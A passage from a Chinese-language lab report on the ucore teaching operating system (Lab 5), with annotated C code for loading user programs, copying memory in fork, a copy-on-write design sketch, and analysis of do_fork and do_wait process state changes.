ph-&gt;p_memsz, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//使用mm_map函数建立合法空间（kern/mm/vmm.c，159——165行）</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *from = binary + ph-&gt;p_offset;</span><br><span class="line">        <span class="keyword">size_t</span> off, <span class="built_in">size</span>;</span><br><span class="line">        <span class="keyword">uintptr_t</span> start = ph-&gt;p_va, <span class="built_in">end</span>, la = ROUNDDOWN(start, PGSIZE);</span><br><span class="line"></span><br><span class="line">        ret = -E_NO_MEM;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//(3.6) alloc memory, and  copy the contents of every program section (from, from+end) to process's memory (la, la+end)</span></span><br><span class="line">        <span class="built_in">end</span> = ph-&gt;p_va + ph-&gt;p_filesz;</span><br><span class="line">     <span class="comment">//(3.6.1) copy TEXT/DATA section of bianry program</span></span><br><span class="line">        <span class="comment">//这里是拷贝内容，memcpy是拷贝函数</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; <span class="built_in">end</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, <span class="built_in">size</span> = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memcpy</span>(page2kva(page) + off, from, <span class="built_in">size</span>);<span class="comment">//拷贝函数</span></span><br><span class="line">            start += <span class="built_in">size</span>, from += <span class="built_in">size</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//(3.6.2) build BSS section of binary program</span></span><br><span class="line">        <span class="comment">//执行程序的BSS段需要清空，这里全部设置为0</span></span><br><span class="line">        <span class="built_in">end</span> = ph-&gt;p_va + ph-&gt;p_memsz;</span><br><span class="line">        <span class="keyword">if</span> (start &lt; la) &#123;</span><br><span class="line">            <span class="comment">/* ph-&gt;p_memsz == ph-&gt;p_filesz */</span></span><br><span class="line">            <span class="keyword">if</span> (start == <span class="built_in">end</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start + PGSIZE - la, <span class="built_in">size</span> = PGSIZE - off;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, <span class="built_in">size</span>);<span class="comment">//设置为0</span></span><br><span class="line">            start += <span class="built_in">size</span>;</span><br><span class="line">            assert((<span class="built_in">end</span> &lt; la &amp;&amp; start == <span class="built_in">end</span>) || (<span class="built_in">end</span> &gt;= la &amp;&amp; start == la));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; <span class="built_in">end</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">            &#125;</span><br><span class="line">            off = start - la, <span class="built_in">size</span> = PGSIZE - off, la += PGSIZE;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">end</span> &lt; la) &#123;</span><br><span class="line">                <span class="built_in">size</span> -= la - <span class="built_in">end</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">memset</span>(page2kva(page) + off, <span class="number">0</span>, <span class="built_in">size</span>);</span><br><span class="line">            start += <span class="built_in">size</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//(4) build user stack memory</span></span><br><span class="line">    <span class="comment">//除了数据段、代码段、进程还需要用户堆栈空间。这里是构造用户堆栈。</span></span><br><span class="line">    vm_flags = VM_READ | VM_WRITE | VM_STACK;</span><br><span class="line">    <span class="keyword">if</span> ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, <span class="literal">NULL</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重新建立mm_map堆栈</span></span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-2</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-3</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP<span class="number">-4</span>*PGSIZE , PTE_USER) != <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//(5) set current process's mm, sr3, and set CR3 reg = physical addr of Page Directory</span></span><br><span class="line">    <span class="comment">//建立好映射关系</span></span><br><span class="line">    mm_count_inc(mm);</span><br><span class="line">    current-&gt;mm = mm;</span><br><span class="line">    current-&gt;cr3 = PADDR(mm-&gt;pgdir);</span><br><span class="line">    lcr3(PADDR(mm-&gt;pgdir));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//(6) setup trapframe for user environment</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    <span class="comment">/* LAB5:EXERCISE1 YOUR CODE</span></span><br><span class="line"><span class="comment">     * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span></span><br><span class="line"><span class="comment">     * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span></span><br><span class="line"><span class="comment">     *          tf_cs should be USER_CS segment (see memlayout.h)</span></span><br><span class="line"><span class="comment">     *          tf_ds=tf_es=tf_ss should be USER_DS segment</span></span><br><span class="line"><span class="comment">     *          tf_esp should be the top addr of user stack (USTACKTOP)</span></span><br><span class="line"><span class="comment">     *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span></span><br><span class="line"><span class="comment">     *          tf_eflags should be set to enable computer to produce Interrupt</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//完成一个优先级的转变，从内核态切换到用户态（特权级从0到3）实现部分</span></span><br><span class="line">    tf-&gt;tf_cs = USER_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = USTACKTOP;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">    <span class="comment">//*tf是一个是中断帧的指针，总是指向内核栈的某个位置：当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态。当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值。</span></span><br><span class="line"><span class="comment">//其定义在（kern/trap/trap.h，60——82行）。</span></span><br><span class="line"><span class="comment">//1、将tf_cs设置为用户态，这个定义在（kern/mm/memlayout.h，第21行），有一个宏定义已经定义了用户态和内核态。</span></span><br><span class="line"><span class="comment">//2、tf_ds=tf_es=tf_ss也需要设置为用户态：定义在（kern/mm/memlayout.h，第26行）</span></span><br><span class="line"><span class="comment">//3、需要将esp设置为用户栈的栈顶，直接使用之前建立用户栈时的参数USTACKTOP就可以。</span></span><br><span class="line"><span class="comment">//4、eip是程序的入口，elf类的e_entry函数直接声明了，直接使用。</span></span><br><span class="line"><span class="comment">//5、FL_IF打开中断。</span></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">bad_cleanup_mmap:</span><br><span class="line">    exit_mmap(mm);</span><br><span class="line">bad_elf_cleanup_pgdir:</span><br><span class="line">    put_pgdir(mm);</span><br><span class="line">bad_pgdir_cleanup_mm:</span><br><span class="line">    mm_destroy(mm);</span><br><span class="line">bad_mm:</span><br><span class="line">    <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>总的调用流程如下</p>
<p><img src="/images/loading.gif" data-original="/posts/c606d982/image-20200425202949732.png" alt="image-20200425202949732"></p>
<h2 id="练习2-父进程复制自己的内存空间给子进程（需要编码）"><a href="#练习2-父进程复制自己的内存空间给子进程（需要编码）" class="headerlink" title="练习2: 父进程复制自己的内存空间给子进程（需要编码）"></a>练习2: 父进程复制自己的内存空间给子进程（需要编码）</h2><p>创建子进程的函数do_fork在执行中将拷贝当前进程（即父进程）的用户内存地址空间中的合法内容到新进程中（子进程），完成内存资源的复制。具体是通过copy_range函数（位于kern/mm/pmm.c中）实现的，请补充copy_range的实现，确保能够正确执行。</p>
<p>请在实验报告中简要说明如何设计实现”Copy on Write 机制“，给出概要设计，鼓励给出详细设计。</p>
<blockquote>
<p>Copy-on-write（简称COW）的基本概念是指如果有多个使用者对一个资源A（比如内存块）进行读操作，则每个使用者只需获得一个指向同一个资源A的指针，就可以该资源了。若某使用者需要对这个资源A进行写操作，系统会对该资源进行拷贝操作，从而使得该“写操作”使用者获得一个该资源A的“私有”拷贝—资源B，可对资源B进行写操作。该“写操作”使用者对资源B的改变对于其他的使用者而言是不可见的，因为其他使用者看到的还是资源A。</p>
</blockquote>
<h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看copy_range函数</p>
<p>根据注释将内容补全</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span></span><br><span class="line"><span class="comment"> * @to:    the addr of process B's Page Directory</span></span><br><span class="line"><span class="comment"> * @from:  the addr of process A's Page Directory</span></span><br><span class="line"><span class="comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn't be used.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">copy_range(<span class="keyword">pde_t</span> *to, <span class="keyword">pde_t</span> *from, <span class="keyword">uintptr_t</span> start, <span class="keyword">uintptr_t</span> <span class="built_in">end</span>, <span class="keyword">bool</span> share) &#123;</span><br><span class="line">    assert(start % PGSIZE == <span class="number">0</span> &amp;&amp; <span class="built_in">end</span> % PGSIZE == <span class="number">0</span>);</span><br><span class="line">    assert(USER_ACCESS(start, <span class="built_in">end</span>));</span><br><span class="line">    <span class="comment">// copy content by page unit.</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//call get_pte to find process A's pte according to the addr start</span></span><br><span class="line">        <span class="keyword">pte_t</span> *ptep = get_pte(from, start, <span class="number">0</span>), *nptep;</span><br><span class="line">        <span class="keyword">if</span> (ptep == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            start = ROUNDDOWN(start + PTSIZE, PTSIZE);</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//call get_pte to find process B's pte according to the addr start. If pte is NULL, just alloc a PT</span></span><br><span class="line">        <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nptep = get_pte(to, start, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);</span><br><span class="line">        <span class="comment">//get page from ptep</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> = <span class="title">pte2page</span>(*<span class="title">ptep</span>);</span></span><br><span class="line">        <span class="comment">// alloc a page for process B</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">npage</span>=<span class="title">alloc_page</span>();</span></span><br><span class="line">        assert(page!=<span class="literal">NULL</span>);</span><br><span class="line">        assert(npage!=<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">/* LAB5:EXERCISE2 YOUR CODE</span></span><br><span class="line"><span class="comment">         * replicate content of page to npage, build the map of phy addr of nage with the linear addr start</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Some Useful MACROs and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">         * MACROs or Functions:</span></span><br><span class="line"><span class="comment">                  *    page2kva(struct Page *page): return the kernel vritual addr of memory which page managed (SEE pmm.h)</span></span><br><span class="line"><span class="comment">         *    page_insert: build the map of phy addr of an Page with the linear addr la</span></span><br><span class="line"><span class="comment">         *    memcpy: typical memory copy function</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * (1) find src_kvaddr: the kernel virtual address of page</span></span><br><span class="line"><span class="comment">         * (2) find dst_kvaddr: the kernel virtual address of npage</span></span><br><span class="line"><span class="comment">         * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span></span><br><span class="line"><span class="comment">         * (4) build the map of phy addr of  nage with the linear addr start</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">+       <span class="keyword">void</span> * kva_src = page2kva(page);    <span class="comment">//获取老页表的值  </span></span><br><span class="line">+       <span class="keyword">void</span> * kva_dst = page2kva(npage);   <span class="comment">//获取新页表的值  </span></span><br><span class="line">+       <span class="built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);   <span class="comment">//复制操作  </span></span><br><span class="line">+       ret = page_insert(to, npage, start, perm);  </span><br><span class="line">        <span class="comment">//建立子进程页地址起始位置与物理地址的映射关系，prem是权限</span></span><br><span class="line">        assert(ret == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        start += PGSIZE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (start != <span class="number">0</span> &amp;&amp; start &lt; <span class="built_in">end</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="回答问题-1"><a href="#回答问题-1" class="headerlink" title="回答问题"></a>回答问题</h3><p>实现Copy on Write 机制</p>
<blockquote>
<p>Copy-on-write（简称COW）的基本概念是指如果有多个使用者对一个资源A（比如内存块）进行读操作，则每个使用者只需获得一个指向同一个资源A的指针，就可以该资源了。若某使用者需要对这个资源A进行写操作，系统会对该资源进行拷贝操作，从而使得该“写操作”使用者获得一个该资源A的“私有”拷贝—资源B，可对资源B进行写操作。该“写操作”使用者对资源B的改变对于其他的使用者而言是不可见的，因为其他使用者看到的还是资源A。</p>
</blockquote>
<p>设计思路：</p>
<p>当使用fork建立线程时，不立即复制父进程的空间，而是把页设成只读模式，并增加一个计数器，该计数器记录有多少个页引用它，并将计数器+1。如果读页时可以共享，当第一次对某个页进行写操作，会因为该页的只读模式而发生缺页异常，此时再复制原来的页，对原来的页计数器-1。释放页的引用后，对该页的计数器-1，当计数器为0时，该页才可真正被释放。</p>
<h2 id="练习3-阅读分析源代码，理解进程执行-fork-exec-wait-exit-的实现，以及系统调用的实现"><a href="#练习3-阅读分析源代码，理解进程执行-fork-exec-wait-exit-的实现，以及系统调用的实现" class="headerlink" title="练习3: 阅读分析源代码，理解进程执行 fork/exec/wait/exit 的实现，以及系统调用的实现"></a>练习3: 阅读分析源代码，理解进程执行 fork/exec/wait/exit 的实现，以及系统调用的实现</h2><p>请在实验报告中简要说明你对 fork/exec/wait/exit函数的分析。并回答如下问题：</p>
<ul>
<li>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？</li>
<li>请给出ucore中一个用户态进程的执行状态生命周期图（包执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。（字符方式画即可）</li>
</ul>
<p>执行：make grade。如果所显示的应用程序检测都输出ok，则基本正确。（使用的是qemu-1.0.1）</p>
<h3 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h3><p>执行make grade</p>
<p><img src="/images/loading.gif" data-original="/posts/c606d982/image-20200501110421557.png" alt="image-20200501110421557"></p>
<p>满分</p>
<h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><blockquote>
<p>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？</p>
</blockquote>
<p>进程状态宏定义</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">process</span> state       :     meaning               -- reason</span><br><span class="line">    PROC_UNINIT     :   uninitialized           -- alloc_proc</span><br><span class="line">    PROC_SLEEPING   :   sleeping                -- try_free_pages, do_wait, do_sleep</span><br><span class="line">    PROC_RUNNABLE   :   runnable(maybe <span class="built_in">running</span>) -- proc_init, wakeup_proc, </span><br><span class="line">    PROC_ZOMBIE     :   almost dead             -- do_exit</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>fork不会影响当前进程的执行状态，但是会将子进程的状态标记为<strong>就绪态(RUNNALB)</strong>，使得可以在后续的调度中运行起来</p>
<p>查看do_fork()函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* do_fork -     parent process for a new child process</span></span><br><span class="line"><span class="comment"> * @clone_flags: used to guide how to clone the child process</span></span><br><span class="line"><span class="comment"> * @stack:       the parent's user stack pointer. if stack==0, It means to fork a kernel thread.</span></span><br><span class="line"><span class="comment"> * @tf:          the trapframe info, which will be copied to child process's proc-&gt;tf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE2 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Some Useful MACROs, Functions and DEFINEs, you can use them in below implementation.</span></span><br><span class="line"><span class="comment">     * MACROs or Functions:</span></span><br><span class="line"><span class="comment">     *   alloc_proc:   create a proc struct and init fields (lab4:exercise1)</span></span><br><span class="line"><span class="comment">     *   setup_kstack: alloc pages with size KSTACKPAGE as process kernel stack</span></span><br><span class="line"><span class="comment">     *   copy_mm:      process "proc" duplicate OR share process "current"'s mm according clone_flags</span></span><br><span class="line"><span class="comment">     *                 if clone_flags &amp; CLONE_VM, then "share" ; else "duplicate"</span></span><br><span class="line"><span class="comment">     *   copy_thread:  setup the trapframe on the  process's kernel stack top and</span></span><br><span class="line"><span class="comment">     *                 setup the kernel entry point and stack of process</span></span><br><span class="line"><span class="comment">     *   hash_proc:    add proc into proc hash_list</span></span><br><span class="line"><span class="comment">     *   get_pid:      alloc a unique pid for process</span></span><br><span class="line"><span class="comment">     *   wakup_proc:   set proc-&gt;state = PROC_RUNNABLE</span></span><br><span class="line"><span class="comment">     * VARIABLES:</span></span><br><span class="line"><span class="comment">     *   proc_list:    the process set's list</span></span><br><span class="line"><span class="comment">     *   nr_process:   the number of process set</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="comment">//    6. call wakup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//LAB5 YOUR CODE : (update LAB4 steps)</span></span><br><span class="line">   <span class="comment">/* Some Functions</span></span><br><span class="line"><span class="comment">    *    set_links:  set the relation links of process.  ALSO SEE: remove_links:  lean the relation links of process </span></span><br><span class="line"><span class="comment">    *    -------------------</span></span><br><span class="line"><span class="comment">	*    update step 1: set child proc's parent to current process, make sure current process's wait_state is 0</span></span><br><span class="line"><span class="comment">	*    update step 5: insert proc_struct into hash_list &amp;&amp; proc_list, set the relation links of process</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//    1. call alloc_proc to allocate a proc_struct</span></span><br><span class="line">    proc = alloc_proc();</span><br><span class="line">    <span class="keyword">if</span> (!proc) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">	assert(current-&gt;wait_state == <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//    2. call setup_kstack to allocate a kernel stack for child process</span></span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    3. call copy_mm to dup OR share mm according clone_flag</span></span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    4. call copy_thread to setup tf &amp; context in proc_struct</span></span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="comment">//    5. insert proc_struct into hash_list &amp;&amp; proc_list</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    proc-&gt;pid = get_pid();</span><br><span class="line">    <span class="comment">//list_add(&amp;proc_list, &amp;proc-&gt;list_link);</span></span><br><span class="line">    hash_proc(proc);</span><br><span class="line">    set_links(proc);</span><br><span class="line">    <span class="comment">//++nr_process;</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    <span class="comment">//    6. call wakeup_proc to make the new child process RUNNABLE</span></span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    <span class="comment">//    7. set ret vaule using child proc's pid</span></span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line">	</span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>具体实现步骤为</p>
<p>1、分配并初始化进程控制块(alloc_proc 函数);</p>
<p>2、为子进程分配并初始化内核栈(setup_stack 函数);</p>
<p>3、根据 clone_flag标志复制或共享进程内存管理结构(copy_mm 函数);</p>
<p>4、设置进程在内核(将来也包括用户态)正常运行和调度所需的中断帧和执行上下文(copy_thread 函数);</p>
<p>5、把设置好的进程控制块放入hash_list 和 proc_list 两个全局进程链表中;</p>
<p>6、自此,进程已经准备好执行了,把进程状态设置为<strong>“就绪”(RUNNABLE）态</strong>;</p>
<p>7、设置返回码为子进程的 id 号。</p>
</li>
<li><p>exec不会影响当前进程的执行状态，但是会修改当前进程中执行的程序(将内容清空再替换)</p>
<p>详细代码介绍及运行过程参考练习1</p>
</li>
<li><p>wait系统调用取决于是否存在可以释放资源（ZOMBIE）的子进程，如果有的话不会发生状态的改变，如果没有的话会将当前进程置为SLEEPING态，等待执行了exit的子进程将其唤醒；</p>
<p>查看do_wait函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do_wait - wait one OR any children with PROC_ZOMBIE state, and free memory space of kernel stack</span></span><br><span class="line"><span class="comment">//         - proc struct of this child.</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> only after do_wait function, all resources of the child proces are free.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_wait(<span class="keyword">int</span> pid, <span class="keyword">int</span> *code_store) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)code_store, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> intr_flag, haskid;</span><br><span class="line">repeat:</span><br><span class="line">    haskid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        proc = find_proc(pid);</span><br><span class="line">        <span class="keyword">if</span> (proc != <span class="literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<span class="comment">//系统有可释放的资源，跳出循环</span></span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        proc = current-&gt;cptr;</span><br><span class="line">        <span class="keyword">for</span> (; proc != <span class="literal">NULL</span>; proc = proc-&gt;optr) &#123;</span><br><span class="line">            haskid = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<span class="comment">//系统有可释放的资源，跳出循环</span></span><br><span class="line">                <span class="keyword">goto</span> found;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (haskid) &#123;</span><br><span class="line">        current-&gt;state = PROC_SLEEPING;</span><br><span class="line">        current-&gt;wait_state = WT_CHILD;</span><br><span class="line">        schedule();</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> repeat;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_BAD_PROC;</span><br><span class="line"></span><br><span class="line">found:</span><br><span class="line">    <span class="keyword">if</span> (proc == idleproc || proc == initproc) &#123;</span><br><span class="line">        panic(<span class="string">"wait idleproc or initproc.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (code_store != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *code_store = proc-&gt;exit_code;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        unhash_proc(proc);</span><br><span class="line">        remove_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>exit会将当前进程的状态修改为ZOMBIE态，并且会将父进程唤醒（修改为RUNNABLE），然后主动让出CPU使用权</p>
<p>查看do_exit代码</p>
